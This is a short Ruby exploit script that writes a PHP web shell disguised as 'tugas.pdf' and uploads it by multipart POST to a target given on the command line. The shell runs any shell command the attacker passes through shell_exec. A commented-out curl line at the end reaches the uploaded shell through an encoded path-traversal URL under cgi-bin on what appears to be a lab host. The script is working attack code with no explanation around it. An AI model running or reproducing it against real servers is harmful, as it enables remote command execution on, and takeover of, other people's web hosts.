require 'net/http/post/multipart'

argv = ARGV


target_uri = URI.parse("http://#{argv.at(0)}:#{argv.at(1)}#{argv.at(2)}")


backdoor_file = "tugas.pdf"
backdoor_code = "#!\"C:\\xampp\\php\\php.exe\"\n<?php\n\techo \"Content-type: text/plain; charset=iso-8859-1\\n\\n\";\n\techo shell_exec(\"" + argv.at(3) + "\");\n?>"

File.write(backdoor_file, backdoor_code)


File.open("./#{backdoor_file}") do | exploit |

  target_request = Net::HTTP::Post::Multipart.new target_uri.path,
    "file" => UploadIO.new(exploit, "multipart/form-data", backdoor_file)

  target_response = Net::HTTP.start(target_uri.host, target_uri.port) do |http|
    http.request(target_request)
  end

end










# endpoint = "http://192.168.137.1/cgi-bin/.%%32%65/htdocs/hacklab/websekolah/upload/#{backdoor_file}"
# system("curl #{endpoint}")
